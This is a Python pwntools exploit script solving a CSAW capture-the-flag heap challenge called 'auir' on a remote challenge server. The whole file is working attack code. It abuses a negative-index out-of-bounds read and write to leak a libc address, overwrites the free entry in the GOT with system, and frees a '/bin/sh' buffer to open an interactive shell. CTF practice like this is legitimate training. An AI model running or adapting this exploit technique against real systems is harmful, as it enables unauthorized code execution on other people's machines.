#!/usr/bin/env python2

from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
#r = process("auir")
#r = process("linux_serverx64")
r = remote("pwn.chal.csaw.io", 7713)
e = ELF("auir")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.23.so")
buf_addr = 0x605310

# set an address to read/write from, using offset -12
# the address will be stored at offset -29
def write_addr(addr):
    r.sendline('3')
    r.recvuntil(">>")
    r.sendline('-12')
    r.recvuntil(">>")
    r.sendline('8')
    r.recvuntil(">>")
    r.send(p64(addr))

# offset to setvbuf@plt: -94
write_addr(0x605020)

# leak address in libc
r.recvuntil(">>")
r.sendline('4')
r.recvuntil(">>")
r.sendline('-29')
r.recvline()
r.recvline()
svb_addr = u64(r.recvn(8))
libc_base = svb_addr - libc.symbols["setvbuf"]
log.info("svb_addr: " + hex(svb_addr))
log.info("libc base: " + hex(libc_base))
r.recvuntil(">>")
# now get system, set it to free@plt, which is at 0x605060
sys_addr = libc_base + libc.symbols['system']

write_addr(0x605060)
r.sendline('3')
r.recvuntil('>>')
r.sendline('-29')
r.sendline('8')
r.recvuntil(">>")
r.send(p64(sys_addr))

# now just make a zealot with /bin/sh and free it
r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
payload = "/bin/sh\x00"
r.sendline(str(len(payload)))
r.recvuntil(">>")
r.send(payload)
r.recvuntil(">>")
r.sendline("2")
r.recvuntil(">>")
r.sendline("0")
r.interactive()
